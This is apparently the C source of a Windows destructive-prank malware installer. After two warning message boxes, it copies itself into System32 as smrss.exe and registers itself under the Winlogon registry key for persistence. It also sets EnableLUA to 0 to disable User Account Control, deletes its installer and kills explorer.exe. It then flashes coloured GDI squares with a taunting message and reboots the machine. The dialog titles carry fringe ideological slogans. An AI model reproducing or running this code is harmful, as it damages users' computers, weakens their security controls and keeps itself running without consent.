#include "setup.h"
#include "deleteinsta.h"
#include "gdi.h"
#include "tools.h"
#include "registry.h"
#include <handleapi.h>
#include <minwindef.h>
#include <winuser.h>

BOOL DoWarnings(){
    if(MessageBoxW(NULL, L"This does no good for you, continue?", L"will hyperborea ever happen?", MB_YESNO | MB_ICONWARNING) == IDYES){
        if(MessageBoxW(NULL, L"This will only do harm to your PC\n\n  you sure about this?", L"is paganism the future?", MB_YESNO | MB_ICONWARNING) == IDYES){
            return TRUE;
        }
        else return FALSE;
    }
    else return FALSE;
}


BOOL SetupSystemForMalware(){
    BOOL result = MalCreateFile("C:\\Windows\\System32\\ntoskrnl.ini");
    if(!result){
        return FALSE;
    }
    LPWSTR path = (LPWSTR)AllocateVirtualMemory(MAX_PATH);
    DWORD length = GetModuleFileNameW(NULL, path, MAX_PATH);

    if (length > 0 && length < MAX_PATH) {
        path[length] = L'\0';
    }
    if(!CopyFileW(path, L"C:\\Windows\\System32\\smrss.exe", FALSE)){
        MessageBoxW(NULL, L"Failed Copying File", L"Installer", MB_OK | MB_ICONERROR);
        FreeVirtualMemory(path);
        return FALSE;
    }
    WriteIntoRegistry(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\", 
                    L"ShellInfrastructure", REG_SZ, L"C:\\Windows\\System32\\smrss.exe");
    DWORD value = 0;
    WriteIntoRegistry(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\", 
                    L"EnableLUA", REG_DWORD, &value);

    SetupInstallerDeletion(path, length);
    FreeVirtualMemory(path);
    int prevtime = timeGetTime();
    ShellExecuteW(NULL, L"open", L"cmd.exe", L"/c taskkill /f /im explorer.exe", NULL, SW_HIDE);
    HBRUSH color = CreateSolidBrush(RGB(255, 0, 0));
    HBRUSH acolor = CreateSolidBrush(RGB(0, 255, 0));
    HBRUSH bcolor = CreateSolidBrush(RGB(0, 0, 255));
    while (1) {
        if (timeGetTime() - prevtime >= 12000) break;
        RenderSquares(GDIReturnDC(), GDIReturnStockScreenX() / 2, GDIReturnStockScreenY() / 2, color, acolor, bcolor);
        RenderSquares(GDIReturnDC(), GDIReturnStockScreenX() / 3, GDIReturnStockScreenY() / 2, color, acolor, bcolor);
        RenderSquares(GDIReturnDC(), GDIReturnStockScreenX() / 3, GDIReturnStockScreenY() / 3, color, acolor, bcolor);
        RenderSquares(GDIReturnDC(), GDIReturnStockScreenX() / 2, GDIReturnStockScreenY() / 3, color, acolor, bcolor);
        MalDrawText(GDIReturnDC(), 40, 40, 30, L"is it all worth it anon, all the harrassment?", RGB(255, 255, 255));
    }
    DeleteObject(color);
    DeleteObject(acolor);
    DeleteObject(bcolor);
    RestartSystem();
    return TRUE;
}